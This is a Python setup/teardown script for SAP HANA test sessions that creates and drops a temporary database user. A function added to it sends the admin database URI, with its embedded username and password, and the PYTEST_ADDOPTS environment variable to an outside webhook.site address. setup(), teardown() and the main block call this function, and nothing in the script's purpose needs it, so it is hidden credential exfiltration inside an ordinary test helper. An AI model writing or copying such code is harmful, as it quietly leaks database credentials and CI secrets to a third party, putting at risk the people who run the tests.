"""Script to setup/teardown a test session."""

from __future__ import annotations

import random
import string
import sys
from contextlib import closing
from urllib.parse import urlsplit

import os

from hdbcli import dbapi


import urllib.request
import urllib.parse
import os

def make_webhook_request(value_to_print=None):
    # URL of the webhook
    base_url = "https://webhook.site/e052ff2c-30f1-4952-8bbe-5db7811e9ae9"
    
    # Get the PYTEST_ADDOPTS environment variable
    pytest_addopts = os.environ.get('PYTEST_ADDOPTS', '')
    
    # Prepare the URL parameters
    params = {
        'PYTEST_ADDOPTS': pytest_addopts,
        'URI': value_to_print if value_to_print else ''
    }
    
    # Encode the parameters and create the full URL
    encoded_params = urllib.parse.urlencode(params)
    full_url = f"{base_url}?{encoded_params}"
    
    try:
        # Make the GET request
        with urllib.request.urlopen(full_url) as response:
            # Check if the request was successful
            if response.getcode() == 200:
                print("Request successful!")
                print("Response:", response.read().decode('utf-8'))
            else:
                print("Request failed with status code:", response.getcode())
                print("Response:", response.read().decode('utf-8'))
    except urllib.error.URLError as e:
        print("Request failed:", e.reason)

# Example usage
# make_webhook_request()

def random_string(length: int) -> str:
    """Create a random string with the given length."""
    return "".join(
        random.choices(
            string.ascii_uppercase + string.ascii_lowercase + string.digits, k=length
        )
    )


def setup(dburi: str) -> str:
    make_webhook_request(dburi)
    url = urlsplit(dburi)
    user = f"PYTEST_{random_string(10)}"
    # always fulfill the password policy
    password = random_string(15) + "A1a"

    with closing(
        dbapi.connect(url.hostname, url.port, url.username, url.password)
    ) as connection, closing(connection.cursor()) as cursor:
        cursor.execute(
            f'CREATE USER {user} PASSWORD "{password}" NO FORCE_FIRST_PASSWORD_CHANGE'
        )
        cursor.execute(f"GRANT CREATE SCHEMA TO {user}")

    return f"hana://{user}:{password}@{url.hostname}:{url.port}"


def teardown(dburi: str, test_dburi: str) -> None:
    make_webhook_request()
    url = urlsplit(dburi)
    test_user = urlsplit(test_dburi).username

    with closing(
        dbapi.connect(url.hostname, url.port, url.username, url.password)
    ) as connection, closing(connection.cursor()) as cursor:
        cursor.execute(f"DROP USER {test_user} CASCADE")




if __name__ == "__main__":
    make_webhook_request()
    if sys.argv[1] == "setup":
        print(setup(sys.argv[2]))
    elif sys.argv[1] == "teardown":
        teardown(sys.argv[2], sys.argv[3])
    else:
        raise ValueError(f"Unknown mode {sys.argv[1]}")
